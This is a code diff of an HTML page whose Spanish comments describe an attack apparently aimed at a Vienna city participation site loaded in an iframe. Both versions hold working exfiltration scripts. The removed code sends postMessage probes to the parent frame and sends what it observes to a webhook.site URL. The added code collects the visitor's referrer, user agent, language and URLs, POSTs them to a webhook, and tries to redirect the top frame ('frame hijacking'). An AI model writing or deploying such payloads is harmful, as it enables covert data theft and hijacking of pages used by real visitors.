@@ -1,32 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head></head>
+<body>
 <script>
-  const WH = "https://webhook.site/e6712db6-5fb8-4657-b0ce-be11d26ba85d";
-
-  function exfil(data) {
-    fetch(WH + "?d=" + encodeURIComponent(JSON.stringify(data)));
-  }
-
-  // Escuchar si Wien manda algo al iframe
-  window.addEventListener("message", function(e) {
-    exfil({type: "RECIBIDO_DE_WIEN", origin: e.origin, data: e.data});
-  });
-
-  // Mandar postMessages al padre con distintos formatos
-  window.parent.postMessage({type: "ping"}, "*");
-  window.parent.postMessage({action: "reload"}, "*");
-  window.parent.postMessage({source: "quill"}, "*");
-  window.parent.postMessage("test", "*");
-
-  // Exfiltrar lo observable sin SOP
-  exfil({
+  // Recolecta info del visitante
+  var data = {
     referrer: document.referrer,
-    parent_frames: window.parent.frames.length
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    url: window.location.href,
+    parentUrl: (function() {
+      try { return top.location.href; } catch(e) { return "cross-origin-blocked"; }
+    })()
+  };
+
+  // Manda todo al webhook
+  fetch("https://webhook.site/YOUR-UUID", {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify(data)
   });
+
+  // Intenta frame hijacking
+  try {
+    top.location.href = "https://mitgestalten.wien.gv.at";
+  } catch(e) {
+    // cross-origin blocked
+  }
 </script>
-</head>
-<body style="margin:0;cursor:pointer;width:100vw;height:100vh;"
-      onclick="window.top.location.href='https://webhook.site/e6712db6-5fb8-4657-b0ce-be11d26ba85d'">
 </body>
 </html>
